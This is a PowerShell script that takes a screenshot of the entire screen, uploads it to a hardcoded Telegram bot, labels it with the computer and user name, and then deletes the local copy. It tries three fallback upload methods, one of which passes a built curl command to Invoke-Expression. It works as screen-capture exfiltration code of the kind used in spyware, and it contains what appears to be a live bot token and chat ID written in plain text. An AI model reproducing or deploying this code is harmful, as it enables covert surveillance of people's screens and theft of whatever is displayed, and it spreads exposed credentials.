# SIMPLE SCREENSHOT TO TELEGRAM - FIXED VERSION

# Configuration
$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"  # Bot token
$y = "2146236602"  # Chat ID

# Function to capture and send screenshot
function Capture-Screenshot {
    Write-Host "üì∏ Taking screenshot..." -ForegroundColor Yellow
    
    try {
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        # Capture screen
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
        
        # Save to temp file
        $screenshotPath = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Write-Host "‚úÖ Screenshot saved: $screenshotPath" -ForegroundColor Green
        
        # Send to Telegram - SIMPLER METHOD
        Write-Host "üì§ Sending to Telegram..." -ForegroundColor Yellow
        
        # Create caption
        $caption = "üñ•Ô∏è Screenshot from $env:COMPUTERNAME`nüë§ User: $env:USERNAME`nüìç Time: $(Get-Date -Format 'HH:mm:ss')"
        
        # METHOD 1: Using curl (most reliable)
        try {
            $curlCmd = "curl -s -X POST `"https://api.telegram.org/bot$x/sendPhoto`" -F `"chat_id=$y`" -F `"caption=$caption`" -F `"photo=@$screenshotPath`""
            $result = Invoke-Expression $curlCmd
            
            if ($result) {
                $jsonResult = $result | ConvertFrom-Json
                if ($jsonResult.ok -eq $true) {
                    Write-Host "‚úÖ Screenshot sent successfully!" -ForegroundColor Green
                    Remove-Item $screenshotPath -Force
                    return
                }
            }
        } catch {
            Write-Host "‚ö†Ô∏è  Curl method failed, trying alternative..." -ForegroundColor Yellow
        }
        
        # METHOD 2: Using Invoke-WebRequest with -Form parameter
        try {
            $uri = "https://api.telegram.org/bot$x/sendPhoto"
            $form = @{
                chat_id = $y
                caption = $caption
                photo = Get-Item $screenshotPath
            }
            
            $response = Invoke-WebRequest -Uri $uri -Method Post -Form $form
            $result = $response.Content | ConvertFrom-Json
            
            if ($result.ok) {
                Write-Host "‚úÖ Screenshot sent via Invoke-WebRequest!" -ForegroundColor Green
                Remove-Item $screenshotPath -Force
                return
            }
        } catch {
            Write-Host "‚ö†Ô∏è  Method 2 failed, trying direct multipart..." -ForegroundColor Yellow
        }
        
        # METHOD 3: Direct multipart/form-data
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            $boundary = "----WebKitFormBoundary" + (Get-Date).Ticks.ToString("x")
            
            $body = @"
--$boundary
Content-Disposition: form-data; name="chat_id"

$y
--$boundary
Content-Disposition: form-data; name="caption"

$caption
--$boundary
Content-Disposition: form-data; name="photo"; filename="screenshot.png"
Content-Type: image/png

$fileEnc
--$boundary--
"@
            
            $uri = "https://api.telegram.org/bot$x/sendPhoto"
            $response = Invoke-RestMethod -Uri $uri -Method Post `
                -ContentType "multipart/form-data; boundary=$boundary" `
                -Body ([System.Text.Encoding]::UTF8.GetBytes($body))
            
            if ($response.ok) {
                Write-Host "‚úÖ Screenshot sent via direct method!" -ForegroundColor Green
                Remove-Item $screenshotPath -Force
                return
            }
        } catch {
            Write-Host "‚ùå All methods failed!" -ForegroundColor Red
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        }
        
    } catch {
        Write-Host "‚ùå Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Test the connection first
function Test-BotConnection {
    Write-Host "üîó Testing bot connection..." -ForegroundColor Yellow
    try {
        $url = "https://api.telegram.org/bot$x/getMe"
        $response = Invoke-RestMethod -Uri $url
        if ($response.ok) {
            Write-Host "‚úÖ Bot is working: @$($response.result.username)" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "‚ùå Bot connection failed!" -ForegroundColor Red
        Write-Host "Check your bot token and chat ID" -ForegroundColor Yellow
        return $false
    }
}

# Execute
Clear-Host
Write-Host "Screenshot to Telegram Test" -ForegroundColor Cyan
Write-Host "===========================" -ForegroundColor Cyan

if (Test-BotConnection) {
    Capture-Screenshot
}
